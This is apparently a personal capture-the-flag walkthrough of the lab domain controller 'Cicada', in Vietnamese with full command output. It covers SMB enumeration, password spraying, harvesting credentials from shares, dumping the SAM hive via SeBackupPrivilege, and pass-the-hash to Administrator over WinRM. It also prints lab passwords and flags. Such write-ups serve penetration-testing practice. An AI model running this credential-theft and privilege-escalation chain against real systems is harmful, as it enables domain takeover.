
**![[Pasted image 20261114005114.png]]**
# Attack Vector:

- SMB enumeration -> emily oscars
- SEbackupprivilege -> SAM database -> dump ra NTLM hash của Administrator -> Pass-the-hash vào Administrator.


# Enumeration with Nmap

```nmap
NSE Timing: About 99.94% done; ETC: 01:10 (0:00:00 remaining)  
Nmap scan report for 10.129.69.126  
Host is up (0.047s latency).  
Not shown: 988 filtered tcp ports (no-response)  
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-13 01:08:04Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2026-11-13T01:09:25+00:00; +6h58m33s from scanner time.  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-11-13T01:09:25+00:00; +6h58m33s from scanner time.  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-11-13T01:09:25+00:00; +6h58m33s from scanner time.  
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2026-11-13T01:09:25+00:00; +6h58m33s from scanner time.  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:  
|   3:1:1:  
|_    Message signing enabled and required  
|_clock-skew: mean: 6h58m33s, deviation: 0s, median: 6h58m32s  
| smb2-time:  
|   date: 2026-11-13T01:08:45  
|_  start_date: N/A
```


- Nhận xét về host nhưng đại khái như sau:
	- Các cổng vể SMB đều mở với SMBv2 security phù hợp
	- Có 1 cổng 5985 -> có thể sử dụng evil winrm
	- Cổng 53 có thể enumerate DNS
	- cổng 88, 464: nếu kerberos đủ mạnh thì có thể thực hiện kerberoasting.





# SMB Enumeration


```
└──_ $nxc smb cicada.htb -u "guest" -p "" --shares  
SMB         10.129.69.126   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:Tru  
e)  
SMB         10.129.69.126   445    CICADA-DC        [+] cicada.htb\guest:  
SMB         10.129.69.126   445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.69.126   445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.69.126   445    CICADA-DC        -----           -----------     ------  
SMB         10.129.69.126   445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.69.126   445    CICADA-DC        C$                              Default share  
SMB         10.129.69.126   445    CICADA-DC        DEV  
SMB         10.129.69.126   445    CICADA-DC        HR              READ  
SMB         10.129.69.126   445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.69.126   445    CICADA-DC        NETLOGON                        Logon server share  
SMB         10.129.69.126   445    CICADA-DC        SYSVOL                          Logon server share
```

chạy nxc với guest account ta thấy mình có quyền đọc HR

```
└──_ $smbclient //cicada.htb/HR -N  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Mar 14 19:29:09 2024  
 ..                                  D        0  Thu Mar 14 19:21:29 2024  
 Notice from HR.txt                  A     1266  Thu Aug 29 00:31:48 2024  
  
               4168447 blocks of size 4096. 465349 blocks available  
smb: \> get *\  
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*\  
smb: \> get *  
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*  
smb: \> get "Notice from HR.txt"  
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (6,4 KiloBytes/sec) (average 6,4 KiloBytes/sec)  
smb: \> quit  
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $cat "Notice from HR.txt"  
  
Dear new hire!  
  
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something uniq  
ue and secure.  
  
Your default password is: Cicada$M6Corpb*@Lp#nZp!8  
  
To change your password:  
  
1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.  
2. Once logged in, navigate to your account settings or profile settings section.  
3. Look for the option to change your password. This will be labeled as "Change Password".  
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special cha  
racters.  
5. After changing your password, make sure to save your changes.  
  
Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.  
  
If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.  
  
Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!  
  
Best regards,  
Cicada Corp
```

chúng ta có default password "Cicada$M6Corpb*@Lp#nZp!8"


well chúng ta có thể sử dụng nxc --rid-brute để sử enumerate các user có trong hệ thống SMB này thông qua SID


```
└──_ $nxc smb cicada.htb -u "guest" -p "" --rid-brute  
SMB         10.129.69.126   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:Tru  
e)  
SMB         10.129.69.126   445    CICADA-DC        [+] cicada.htb\guest:  
SMB         10.129.69.126   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)  
SMB         10.129.69.126   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)  
SMB         10.129.69.126   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.69.126   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.69.126   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)  
SMB         10.129.69.126   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)  
SMB         10.129.69.126   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)  
SMB         10.129.69.126   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

chúng ta có các người dùng sau tiện thể cũng sử dụng nxc để password spray

```
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $cat user.txt  
john.smoulder  
sarah.dantelia  
michael.wrightson  
david.orelious  
emily.oscars  
Administrator  
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $nxc smb cicada.htb -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'  
SMB         10.129.69.126   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:Tru  
e)  
SMB         10.129.69.126   445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.69.126   445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE  
SMB         10.129.69.126   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```



từ đó ta có được user michael.wrightson

```
└──_ $nxc smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users  
SMB         10.129.69.126   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:Tru  
e)  
SMB         10.129.69.126   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  
SMB         10.129.69.126   445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-  
SMB         10.129.69.126   445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain  
SMB         10.129.69.126   445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain  
SMB         10.129.69.126   445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account  
SMB         10.129.69.126   445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2  
SMB         10.129.69.126   445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2  
SMB         10.129.69.126   445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0  
SMB         10.129.69.126   445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3  
SMB         10.129.69.126   445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1  
SMB         10.129.69.126   445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

khi bạn enumerate các user trong này bạn sẽ thấy có david.orelious và password aRt$Lp#7t*VQ!3 

```
┌─[_]─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $nxc smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares  
SMB         10.129.69.126   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:Tru  
e)  
SMB         10.129.69.126   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3  
SMB         10.129.69.126   445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.69.126   445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.69.126   445    CICADA-DC        -----           -----------     ------  
SMB         10.129.69.126   445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.69.126   445    CICADA-DC        C$                              Default share  
SMB         10.129.69.126   445    CICADA-DC        DEV             READ  
SMB         10.129.69.126   445    CICADA-DC        HR              READ  
SMB         10.129.69.126   445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.69.126   445    CICADA-DC        NETLOGON        READ            Logon server share  
SMB         10.129.69.126   445    CICADA-DC        SYSVOL          READ            Logon server share
```

có vẻ như người dùng này đọc được dev share

```
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $smbclient //cicada.htb/DEV -U david.orelious  
Password for [WORKGROUP\david.orelious]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Mar 14 19:31:39 2024  
 ..                                  D        0  Thu Mar 14 19:21:29 2024  
 Backup_script.ps1                   A      601  Thu Aug 29 00:28:22 2024  
  
               4168447 blocks of size 4096. 477744 blocks available  
smb: \> get Backup_script.ps1  
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3,0 KiloBytes/sec) (average 3,0 KiloBytes/sec)  
smb: \> quit  
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $cat *.ps1  
  
$sourceDirectory = "C:\smb"  
$destinationDirectory = "D:\Backup"  
  
$username = "emily.oscars"  
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force  
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)  
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"  
$backupFileName = "smb_backup_$dateStamp.zip"  
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName  
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath  
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
khi mà bạn vào được file dev thì bạn đã thấy được emily.oscars là credential cần tìm

# Evil-winrm as emily.oscars

đây là bằng chứng rằng bạn có thể dùng winrm
```
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $nxc winrm cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'  
WINRM       10.129.69.126   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)  
WINRM       10.129.69.126   5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```


và boom bạn có user.txt
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> pwd  
  
Path  
----  
C:\Users\emily.oscars.CICADA\Documents  
  
  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls  
  
  
   Directory: C:\Users\emily.oscars.CICADA\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-ar---        11/13/2026   2:29 PM             34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt  
a0b93b5501d2a144757a600dd5e03c4b  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop>
```




# Administrator shell

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeBackupPrivilege             Back up files and directories  Enabled  
SeRestorePrivilege            Restore files and directories  Enabled  
SeShutdownPrivilege           Shut down the system           Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

tôi thấy rằng SeBackupPrivilege đang được bật lên => lấy được SAM database

```
  
*Evil-WinRM* PS C:\> cd Shares  
*Evil-WinRM* PS C:\Shares> ls  
  
  
   Directory: C:\Shares  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         3/14/2024   5:31 AM                DEV  
d-----         3/14/2024   5:29 AM                HR  
  
  
*Evil-WinRM* PS C:\Shares> cd DEV  
*Evil-WinRM* PS C:\Shares\DEV> clear  
*Evil-WinRM* PS C:\Shares\DEV> ls  
  
  
   Directory: C:\Shares\DEV  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----         8/28/2024  10:28 AM            601 Backup_script.ps1  
  
  
*Evil-WinRM* PS C:\Shares\DEV> reg save hklm\sam C:\Shares\DEV\sam.hive  
  
The operation completed successfully.  
  
*Evil-WinRM* PS C:\Shares\DEV> reg save hklm\system C:\Shares\DEV\system.hive  
The operation completed successfully.  
  
*Evil-WinRM* PS C:\Shares\DEV> dir  
  
  
   Directory: C:\Shares\DEV  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----         8/28/2024  10:28 AM            601 Backup_script.ps1  
-a----        11/13/2026   2:51 PM          49152 sam.hive  
-a----        11/13/2026   2:51 PM       18542592 system.hive
```

lưu sam và system ở dev share


```
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $smbclient //cicada.htb/DEV -U david.orelious  
Password for [WORKGROUP\david.orelious]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Nov 14 05:51:45 2026  
 ..                                  D        0  Thu Mar 14 19:21:29 2024  
 Backup_script.ps1                   A      601  Thu Aug 29 00:28:22 2024  
 sam.hive                            A    49152  Sat Nov 14 05:51:22 2026  
 system.hive                         A 18542592  Sat Nov 14 05:51:45 2026  
  
               4168447 blocks of size 4096. 477490 blocks available  
smb: \> get sam.hive  
getting file \sam.hive of size 49152 as sam.hive (166,1 KiloBytes/sec) (average 166,1 KiloBytes/sec)  
smb: \> get system.hive  
  
  
getting file \system.hive of size 18542592 as system.hive (1188,8 KiloBytes/sec) (average 1169,8 KiloBytes/sec)  
smb: \>  
smb: \>  
smb: \> exit  
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $ls  
'Active Directory and Pivoting, Tunneling, port forwarding'   Enumeration           pc.txt                  sam.hive      user.txt  
Backup_script.ps1                                            images               'Privilege Escalation'   system.hive  'Web Pentest'  
Cheatsheet                                                  'Notice from HR.txt'   README.md               Tools         Write-up  
┌─[gerryhtb@parrot]─[~/Desktop/HackNote]  
└──_ $impacket-secretsdump -sam sam.hive -system system.hive LOCAL  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.  
[*] Cleaning up...
```

đăng nhập vào và có được hash của administrator


```
┌─[_]─[gerryhtb@parrot]─[~/Desktop/HackNote]
└──_ $nxc winrm cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
WINRM       10.129.69.126   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.69.126   5985   CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
```

có vẻ hệ thống cho chúng ta thực hiện việc pass-the-hash vào được administrator

```
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls  
  
  
   Directory: C:\Users\Administrator\Documents  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         3/14/2024  10:20 PM                WindowsPowerShell  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..  
*Evil-WinRM* PS C:\Users\Administrator> cd ..  
*Evil-WinRM* PS C:\Users> cd Administrator  
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls  
  
  
   Directory: C:\Users\Administrator\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-ar---        11/13/2026   2:29 PM             34 root.txt  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
96618206247ca897044095e234441e83  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> pwd
```
thế là bạn có root bằng cách sử dụng evil-winrm

